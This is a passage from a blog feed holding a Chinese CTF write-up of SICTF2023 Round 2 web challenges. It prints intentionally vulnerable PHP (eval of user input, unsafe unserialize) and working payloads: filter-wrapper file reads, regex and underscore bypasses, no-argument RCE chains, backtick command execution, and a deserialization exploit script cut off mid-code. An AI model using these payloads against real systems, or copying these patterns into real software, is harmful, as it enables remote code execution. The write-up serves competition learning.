总结</h2>\n<pre><code>\t这次比赛对于我这个刚接触安全的小白收获还是蛮大的，web题目除了那道java反序列化不会，其他在我的软磨硬泡下都弄出来了，还是有点成就感的，最后也是混了个二等奖，嘻嘻~(\\*/ω＼\\*)。\n</code></pre>\n<p><img data-src=\"../../../images/NSS/polar.png\" alt=\"polar\" /></p>\n",
            "tags": [
                "CTF",
                "无敌的Web",
                "php是世界上最好的语言",
                "我就是歪脖",
                "这次不坐牢了"
            ]
        },
        {
            "id": "https://p1kap1.github.io/CTF/web/SICTF2023-Round2/",
            "url": "https://p1kap1.github.io/CTF/web/SICTF2023-Round2/",
            "title": "SICTF2023-Round2",
            "date_published": "2023-09-08T16:00:00.000Z",
            "content_html": "<h2 id=\"web\"><a class=\"anchor\" href=\"#web\">#</a> Web</h2>\n<h3 id=\"签到-include\"><a class=\"anchor\" href=\"#签到-include\">#</a> [签到] Include</h3>\n<p>php 伪协议直接读 /flag</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>?SICTF<span class=\"token operator\">=</span>php://filter/convert.base64-encode/resource<span class=\"token operator\">=</span>/flag</pre></td></tr></table></figure><h3 id=\"baby_php\"><a class=\"anchor\" href=\"#baby_php\">#</a> Baby_PHP</h3>\n<blockquote>\n<p>代码审计，正则绕过</p>\n</blockquote>\n<p>进入题目是一大串 php 代码：</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token variable\">$query</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_SERVER</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'QUERY_STRING'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'/_|%5f|\\.|%2E/i'</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$query</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'You are Hacker!'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'k_e_y'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">!==</span><span class=\"token string single-quoted-string\">'123'</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'/^123$/'</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'k_e_y'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token keyword\">echo</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"You are will Win!&lt;br>\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'command'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>        <span class=\"token variable\">$command</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'command'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/\\~|\\`|\\@|\\#|\\\\$|\\%|\\&amp;|\\*|\\（|\\）|\\-|\\+|\\=|\\&#123;|\\&#125;|\\[|\\]|\\:|\\'|\\\"|\\,|\\&lt;|\\.|\\>|\\/|\\?|\\\\\\\\/i\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$command</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>            <span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$command</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>        <span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>            <span class=\"token keyword\">echo</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"You are Hacker!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    <span class=\"token keyword\">echo</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"K_e_y is Errors!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre><span class=\"token punctuation\">&#125;</span></span></pre></td></tr></table></figure><p>$_SERVER ['QUERY_STRING'] 获取查询语句，既要绕过 get 参数中下划线的的过滤，还要绕过正则匹配的 123</p>\n<p>我们这里可以利用 php 字符串的解析特性进行 bypass</p>\n<figure class=\"highlight scss\"><figcaption data-lang=\"Sass (Scss)\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>我们知道PHP将查询字符串（在URL或正文中）转换为内部<span class=\"token variable\">$_GET</span>或的关联数组<span class=\"token variable\">$_POST</span>。例如：/?foo=bar变成<span class=\"token function\">Array</span><span class=\"token punctuation\">(</span>[foo] => <span class=\"token string\">\"bar\"</span><span class=\"token punctuation\">)</span>。值得注意的是，查询字符串在解析的过程中会将某些字符删除或用下划线代替。例如，/?<span class=\"token placeholder selector\">%20news</span>[id<span class=\"token placeholder selector\">%00</span>=42会转换为<span class=\"token function\">Array</span><span class=\"token punctuation\">(</span>[news_id] => 42<span class=\"token punctuation\">)</span>。如果一个IDS/IPS或WAF中有一条规则是当news_id参数的值是一个非数字的值则拦截，那么我们就可以用以下语句绕过：</pre></td></tr></table></figure><pre><code>/news.php?%20news[id%00=42&quot;+AND+1=0--\n</code></pre>\n<p>上述 PHP 语句的参数 %20news [id%00 的值将存储到 $_GET [&quot;news_id&quot;] 中。</p>\n<p>HP 需要将所有参数转换为有效的变量名，因此在解析查询字符串时，它会做两件事：</p>\n<blockquote>\n<p>1. 删除空白符</p>\n<p>2. 将某些字符转换为下划线（包括空格）</p>\n</blockquote>\n<p>例如：</p>\n<table>\n<thead>\n<tr>\n<th style=\"text-align:center\">User input</th>\n<th style=\"text-align:center\">Decoded PHP</th>\n<th style=\"text-align:center\">variable name</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:center\">%20foo_bar%00</td>\n<td style=\"text-align:center\">foo_bar</td>\n<td style=\"text-align:center\">foo_bar</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">foo%20bar%00</td>\n<td style=\"text-align:center\">foo bar</td>\n<td style=\"text-align:center\">foo_bar</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">foo%5bbar</td>\n<td style=\"text-align:center\">foo[bar</td>\n<td style=\"text-align:center\">foo_bar</td>\n</tr>\n</tbody>\n</table>\n<p>本题我们可以用空格绕过下划线的过滤</p>\n<p>这里说一下这个正则匹配的 ^ 和 $，这里进行了简单的测试</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token variable\">$subject</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'abcdef'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token variable\">$subject1</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'abcdefs'</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token variable\">$subject2</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"def\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token variable\">$pattern</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'/def/'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token variable\">$pattern</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'/def$/'</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$pattern</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$subject</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$matches</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token function\">print_r</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$matches</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></span></pre></td></tr></table></figure><p>经过测试， <code>$patern</code>  为 <code>/def/</code>  时，只要被测字符串中含有 <code>def</code>  字符串，就会匹配到；而 <code>$pattern</code>  为 <code>/def$/</code>  时，被测字符串中含有 <code>def</code>  的部分必须是 <code>def结尾</code> ，才能够匹配到。 <code>^</code>  亦然。<br />\n这个匹配可以通过在字符串结尾加上回车的 url 编码 <code>%0A</code>  来解决</p>\n<p>第一层 payload:</p>\n<blockquote>\n<p>/?k e y=123%0a</p>\n</blockquote>\n<p>接下来就是绕过这句话：</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/\\~|\\`|\\@|\\#|\\\\$|\\%|\\&amp;|\\*|\\（|\\）|\\-|\\+|\\=|\\&#123;|\\&#125;|\\[|\\]|\\:|\\'|\\\"|\\,|\\&lt;|\\.|\\>|\\/|\\?|\\\\\\\\/i\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$command</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>            <span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$command</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><blockquote>\n<p>command=system(ls);</p>\n</blockquote>\n<p>得到回显</p>\n<blockquote>\n<p>index.php,flag.php</p>\n</blockquote>\n<p>此题目是典型的无参 rce，关于无参 rce 可以参考以下文章：</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvOTM2MA==\">https://xz.aliyun.com/t/9360</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly96aHVhbmxhbi56aGlodS5jb20vcC80MTQyODMyMTU/dXRtX2lkPTA=\">https://zhuanlan.zhihu.com/p/414283215?utm_id=0 </span></p>\n<p>以下 payload 皆可行:</p>\n<blockquote>\n<p>command=show_source(next(array_reverse(scandir(pos(localeconv())))));</p>\n</blockquote>\n<blockquote>\n<p>POST command=session_start();system(session_id());</p>\n<p>Cookie PHPSESSID=tac${IFS}flag.php</p>\n</blockquote>\n<p>ID 中不能带空格所以用 ${IFS} 替代</p>\n<blockquote>\n<p>Cookie:PHPSESSID=flag.php</p>\n<p>command=show_source(session_id(session_start()));</p>\n</blockquote>\n<blockquote>\n<p>command=eval(end(current(get_defined_vars())));</p>\n</blockquote>\n<p>得到 flag。</p>\n<h3 id=\"rce\"><a class=\"anchor\" href=\"#rce\">#</a> RCE</h3>\n<p>题目：</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token variable\">$code</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'code'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token variable\">$code</span> <span class=\"token operator\">=</span> <span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"(\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"hacker\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$code</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token variable\">$code</span> <span class=\"token operator\">=</span> <span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\".\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"hacker\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$code</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$code</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><p>很直球的 rce，过滤了 '(' 号和 '.' 号，但发现没有过滤反引号，可直接命令执行。</p>\n<p>payload:</p>\n<blockquote>\n<p>code=echo `cat /fl*`;</p>\n</blockquote>\n<blockquote>\n<p>code=?&gt;&lt;?=`cat /f*`;  // 这种是看一个大佬一种比较有意思的解法，用？&gt;&lt;? 把前面的 php 文件闭合，再新建一个 php 文件执行代码，也就是相当于可以自己可以创建任何 php 文件，真是个天才。</p>\n</blockquote>\n<h3 id=\"我全都要\"><a class=\"anchor\" href=\"#我全都要\">#</a> 我全都要</h3>\n<p>题目：</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">B</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$pop</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$i</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$nogame</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__destruct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/233333333/\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">pop</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>            <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"这是一道签到题，不能让新生一直做不出来遭受打击\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">game</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>        <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"扣1送地狱火\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">i</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"1\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>            <span class=\"token keyword\">echo</span> <span class=\"token string single-quoted-string\">'&lt;img src=\\'R.jpg\\'>'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>            <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">nogame</span><span class=\"token operator\">-></span><span class=\"token function\">love</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__clone</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>        <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"必须执行\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>        <span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"cmd\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre></pre></td></tr><tr><td data-num=\"29\"></td><td><pre></pre></td></tr><tr><td data-num=\"30\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">A</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$Aec</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$girl</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$boy</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__toString</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>        <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"I also want to fall in love\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">girl</span> <span class=\"token operator\">!=</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">boy</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token function\">md5</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">girl</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token function\">md5</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">boy</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>            <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">Aec</span><span class=\"token operator\">-></span><span class=\"token function\">game</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre></pre></td></tr><tr><td data-num=\"43\"></td><td><pre></pre></td></tr><tr><td data-num=\"44\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre></pre></td></tr><tr><td data-num=\"46\"></td><td><pre></pre></td></tr><tr><td data-num=\"47\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">P</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$MyLover</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__call</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$name</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$arguments</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>        <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"有对象我会在这打CTF???看我克隆一个对象！\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$name</span> <span class=\"token operator\">!=</span> <span class=\"token string double-quoted-string\">\"game\"</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>            <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"打游戏去，别想着对象了\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre>            <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">MyLover</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">clone</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">B</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre></pre></td></tr><tr><td data-num=\"58\"></td><td><pre></pre></td></tr><tr><td data-num=\"59\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre></pre></td></tr><tr><td data-num=\"61\"></td><td><pre></pre></td></tr><tr><td data-num=\"62\"></td><td><pre><span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"A_B_C\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"63\"></td><td><pre>    <span class=\"token variable\">$poc</span><span class=\"token operator\">=</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"A_B_C\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"64\"></td><td><pre>    <span class=\"token function\">unserialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$poc</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"65\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>简单的反序列化，直接上代码：</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">B</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$pop</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$i</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$nogame</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">A</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$Aec</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$girl</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"QNKCDZO\"</span><span class=\"token 